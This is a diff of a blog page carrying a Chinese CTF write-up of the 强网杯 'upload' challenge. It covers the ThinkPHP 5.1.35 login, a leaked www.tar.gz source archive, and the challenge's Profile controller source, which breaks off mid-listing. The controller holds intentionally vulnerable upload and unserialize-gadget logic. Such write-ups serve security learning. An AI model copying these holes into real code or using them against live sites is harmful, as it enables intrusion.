@@ -1,89 +1,480 @@
-<!doctype html>
-<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>强网杯upload - Air</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Air&#039;s blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Air&#039;s blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="登入以后首先是个页面 注册一个账号去登入  弹出了这个，好熟悉，thinkphp  登入之后是个文件上传的页面，尝试去上传一个php，发现不好使，(中间出现了一次报错，爆出了版本为5.1.35，去网上搜了exp，但是没有反序列化入口) 只能上传图片，用dirseach扫目录，发现是源码泄露 www.tar.gz 下载下来源码，进行审计，发现为mvc三层架构，去审计控制器里的源码 因为题目名字叫up"><meta property="og:type" content="blog"><meta property="og:title" content="强网杯upload"><meta property="og:url" content="http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/"><meta property="og:site_name" content="Air"><meta property="og:description" content="登入以后首先是个页面 注册一个账号去登入  弹出了这个，好熟悉，thinkphp  登入之后是个文件上传的页面，尝试去上传一个php，发现不好使，(中间出现了一次报错，爆出了版本为5.1.35，去网上搜了exp，但是没有反序列化入口) 只能上传图片，用dirseach扫目录，发现是源码泄露 www.tar.gz 下载下来源码，进行审计，发现为mvc三层架构，去审计控制器里的源码 因为题目名字叫up"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010112902210.png"><meta property="og:image" content="http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010113008567.png"><meta property="og:image" content="http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/20211010113045948.png"><meta property="og:image" content="http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010150041995.png"><meta property="article:published_time" content="2021-10-10T03:25:42.000Z"><meta property="article:modified_time" content="2021-10-10T07:22:05.943Z"><meta property="article:author" content="Air"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010112902210.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/"},"headline":"强网杯upload","image":["http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010112902210.png","http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010113008567.png","http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/20211010113045948.png","http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010150041995.png"],"datePublished":"2021-10-10T03:25:42.000Z","dateModified":"2021-10-10T07:22:05.943Z","author":{"@type":"Person","name":"Air"},"publisher":{"@type":"Organization","name":"Air","logo":{"@type":"ImageObject","url":"http://example.com/img/logo.svg"}},"description":"登入以后首先是个页面 注册一个账号去登入  弹出了这个，好熟悉，thinkphp  登入之后是个文件上传的页面，尝试去上传一个php，发现不好使，(中间出现了一次报错，爆出了版本为5.1.35，去网上搜了exp，但是没有反序列化入口) 只能上传图片，用dirseach扫目录，发现是源码泄露 www.tar.gz 下载下来源码，进行审计，发现为mvc三层架构，去审计控制器里的源码 因为题目名字叫up"}</script><link rel="canonical" href="http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.4.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Air" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-10-10T03:25:42.000Z" title="2021/10/10 上午11:25:42">2021-10-10</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-10-10T07:22:05.943Z" title="2021/10/10 下午3:22:05">2021-10-10</time></span><span class="level-item">8 minutes read (About 1243 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">强网杯upload</h1><div class="content"><p>登入以后首先是个页面<img src="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010112902210.png" alt="登入界面"></p>
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Air">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="登入以后首先是个页面 注册一个账号去登入  弹出了这个，好熟悉，thinkphp  登入之后是个文件上传的页面，尝试去上传一个php，发现不好使，(中间出现了一次报错，爆出了版本为5.1.35，去网上搜了exp，但是没有反序列化入口) 只能上传图片，用dirseach扫目录，发现是源码泄露 www.tar.gz 下载下来源码，进行审计，发现为mvc三层架构，去审计控制器里的源码 因为题目名字叫up">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯upload">
+<meta property="og:url" content="http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/index.html">
+<meta property="og:site_name" content="Air">
+<meta property="og:description" content="登入以后首先是个页面 注册一个账号去登入  弹出了这个，好熟悉，thinkphp  登入之后是个文件上传的页面，尝试去上传一个php，发现不好使，(中间出现了一次报错，爆出了版本为5.1.35，去网上搜了exp，但是没有反序列化入口) 只能上传图片，用dirseach扫目录，发现是源码泄露 www.tar.gz 下载下来源码，进行审计，发现为mvc三层架构，去审计控制器里的源码 因为题目名字叫up">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010112902210.png">
+<meta property="og:image" content="http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010113008567.png">
+<meta property="og:image" content="http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/20211010113045948.png">
+<meta property="og:image" content="http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010150041995.png">
+<meta property="article:published_time" content="2021-10-10T03:25:42.000Z">
+<meta property="article:modified_time" content="2021-10-10T07:22:05.943Z">
+<meta property="article:author" content="Air">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010112902210.png">
+  
+  
+  <title>强网杯upload - Air</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="强网杯upload">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-10 11:25" pubdate>
+        2021年10月10日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.3k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      53 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">强网杯upload</h1>
+            
+            <div class="markdown-body">
+              <p>登入以后首先是个页面<img src="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010112902210.png" srcset="/img/loading.gif" lazyload alt="登入界面"></p>
 <p>注册一个账号去登入</p>
-<p><img src="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010113008567.png"></p>
+<p><img src="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010113008567.png" srcset="/img/loading.gif" lazyload></p>
 <p>弹出了这个，好熟悉，thinkphp</p>
-<p><img src="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/20211010113045948.png"></p>
+<p><img src="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/20211010113045948.png" srcset="/img/loading.gif" lazyload></p>
 <p>登入之后是个文件上传的页面，尝试去上传一个php，发现不好使，(中间出现了一次报错，爆出了版本为5.1.35，去网上搜了exp，但是没有反序列化入口) 只能上传图片，用dirseach扫目录，发现是源码泄露</p>
 <p><a target="_blank" rel="noopener" href="http://www.tar.gz/">www.tar.gz</a></p>
 <p>下载下来源码，进行审计，发现为mvc三层架构，去审计控制器里的源码</p>
 <p>因为题目名字叫upload，那应该就是文件上传喽，先审profile里的代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_menu=md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        @chdir(<span class="string">&quot;../public/upload&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;upload_menu))&#123;</span><br><span class="line">            @mkdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$user_info</span>=db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&quot;ID&quot;</span>,<span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">&#x27;ID&#x27;</span>])-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$user_info</span>[<span class="string">&#x27;img&#x27;</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;img)&#123;</span><br><span class="line">            <span class="keyword">if</span>(db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&#x27;ID&#x27;</span>,<span class="variable">$user_info</span>[<span class="string">&#x27;ID&#x27;</span>])-&gt;data([<span class="string">&quot;img&quot;</span>=&gt;addslashes(<span class="keyword">$this</span>-&gt;img)])-&gt;update())&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_cookie();</span><br><span class="line">                <span class="keyword">$this</span>-&gt;success(<span class="string">&#x27;Upload img successful!&#x27;</span>, url(<span class="string">&#x27;../home&#x27;</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Upload file failed!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">&#x27;img&#x27;</span>]=<span class="keyword">$this</span>-&gt;img;</span><br><span class="line">        cookie(<span class="string">&quot;user&quot;</span>,base64_encode(serialize(<span class="keyword">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ext_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ext_arr</span>=explode(<span class="string">&quot;.&quot;</span>,<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext=end(<span class="variable">$ext_arr</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext==<span class="string">&quot;png&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_menu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$img</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker=<span class="hljs-keyword">new</span> Index();<br>        <span class="hljs-keyword">$this</span>-&gt;upload_menu=md5(<span class="hljs-variable">$_SERVER</span>[<span 